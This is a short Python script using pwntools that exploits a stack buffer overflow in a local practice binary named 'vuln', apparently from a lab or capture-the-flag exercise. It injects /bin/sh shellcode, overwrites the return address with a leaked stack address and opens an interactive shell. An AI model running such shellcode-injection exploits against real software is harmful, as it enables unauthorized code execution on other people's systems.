#!/usr/bin/env python
from pwn import *


BIN = "./vuln"
context.binary = BIN
context.log_level = "ERROR"

# Determined through static analysis.
bytes_read = 64
offset = 48

shellcode_asm = shellcraft.sh()
# shellcode_asm = "sub rsp, 64\n" + shellcode_asm
print(" ==== SHELLCODE ====")
print(shellcode_asm)
shellcode = asm(shellcode_asm)
print(len(shellcode))

io = gdb.debug(BIN, gdbscript="""
    break vuln.c:9
    continue
    """)

str_addr = io.recvline().strip(b"\n")
addr = int(str_addr, 16)

# Inject and trigger
payload = b""
payload += shellcode
payload += (offset + 8 - len(shellcode)) * b'A'
payload += pack(addr)

io.send(payload)
io.interactive()
